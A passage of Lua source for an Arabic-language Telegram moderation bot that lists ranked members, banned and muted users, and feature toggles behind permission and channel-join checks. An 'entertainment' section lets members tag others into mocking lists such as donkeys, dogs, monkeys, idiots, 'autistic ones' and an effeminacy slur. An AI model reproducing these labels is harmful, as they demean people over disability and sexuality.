local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المطورين', data = msg.sender.user_id..'/Dev'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المالكين' then
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Owners:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مالكين حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه المالكين \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المالكين', data = msg.sender.user_id..'/Owners'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المنشئين الاساسيين' then
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Supcreator:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد منشئين اساسيين حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه المنشئين الاساسيين \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المنشئين الاساسيين', data = msg.sender.user_id..'/Supcreator'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المنشئين' then
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Creator:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد منشئين حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه المنشئين  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المنشئين', data = msg.sender.user_id..'/Creator'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المدراء' then
if not msg.Creator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(5)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Manger:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مدراء حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه المدراء  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المدراء', data = msg.sender.user_id..'/Manger'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'الادمنيه' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Admin:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد ادمنيه حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه الادمنيه  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح الادمنيه', data = msg.sender.user_id..'/Admin'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المميزين' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Special:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مميزين حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه المميزين  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المميزين', data = msg.sender.user_id..'/DelSpecial'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
-----------تسلية-------
if text == 'الفرخات' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."kholat:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد فرخات حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه الفرخات  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح الفرخات', data = msg.sender.user_id..'/Delkholat'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'الوتكات' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."wtka:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد وتكات ناشفة زي المستشفي , ","md",true)  
end
ListMembers = '\n*• قائمه الوتكات  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح الوتكات', data = msg.sender.user_id..'/Delwtk'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المتوحدين' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."twhd:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• مفيش متوحدين هنا كلهم اتعالجو 😂😂 , ","md",true)  
end
ListMembers = '\n*• قائمه المتوحدين  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المتوحدين', data = msg.sender.user_id..'/Deltwhd'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'الجلاب' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."klb:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• مفيش جلاب هنا ارفعلنل شويه نضيهم عضم 😂😂 , ","md",true)  
end
ListMembers = '\n*• قائمه الجلاب  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح الجلاب', data = msg.sender.user_id..'/Delklb'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'الحمير' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."mar:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• مفيش حمير هنا 😂😂 , ","md",true)  
end
ListMembers = '\n*• قائمه الحمير  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح الحمير', data = msg.sender.user_id..'/Delmar'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'اولادي' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."3ra:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• مفيش ولاد روح اتجوز وتعالي 😂 , ","md",true)  
end
ListMembers = '\n*• قائمه اولادك  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح اولادك', data = msg.sender.user_id..'/Del3ra'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'النثيه' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."smb:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• مفيش نثيهاويه هنا 😂😂 , ","md",true)  
end
ListMembers = '\n*• قائمه النثيه  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح النثيه', data = msg.sender.user_id..'/Delsmb'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'القرود' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."2rd:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• مفيش قرود هنا يصحبي 😂😂 , ","md",true)  
end
ListMembers = '\n*• قائمه القرود  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح القرود', data = msg.sender.user_id..'/Del2rd'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'الاغبياء' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."8by:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• مفيش اغبيه هنا يصحبي 😂😂 , ","md",true)  
end
ListMembers = '\n*• قائمه الاغبيه  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح الاغبياء', data = msg.sender.user_id..'/Del8by'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
-----------تسلية-------
if text == 'المحظورين عام' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."BanAll:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد محظورين عام حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه المحظورين عام  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المحظورين عام', data = msg.sender.user_id..'/BanAll'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المكتومين عام' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."ktmAll:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مكتومين عام حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه المكتومين عام  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المكتومين عام', data = msg.sender.user_id..'/ktmAll'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المحظورين' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."BanGroup:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد محظورين حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه المحظورين  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المحظورين', data = msg.sender.user_id..'/BanGroup'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المكتومين' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."SilentGroup:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مكتومين حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه المكتومين  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المكتومين', data = msg.sender.user_id..'/SilentGroupGroup'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text and text:match("^تفعيل (.*)$") and msg.reply_to_message_id == 0 then
local TextMsg = text:match("^تفعيل (.*)$")
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if TextMsg == 'الرابط' then
Redis:set(LaRiCa.."Status:Link"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل الرابط ","md",true)
end
if TextMsg == 'الترحيب' then
Redis:set(LaRiCa.."Status:Welcome"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل الترحيب ","md",true)
end
if TextMsg == 'الايدي' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Status:Id"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل الايدي ","md",true)
end
if TextMsg == 'الايدي بالصوره' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Status:IdPhoto"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل الايدي بالصوره ","md",true)
end
if TextMsg == 'الردود' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Status:Reply"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل الردود ","md",true)
end
if TextMsg == 'الردود العامه' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Status:ReplySudo"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل الردود العامه ","md",true)
end
if TextMsg == 'الحظر' or TextMsg == 'الطرد' or TextMsg == 'التقييد' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
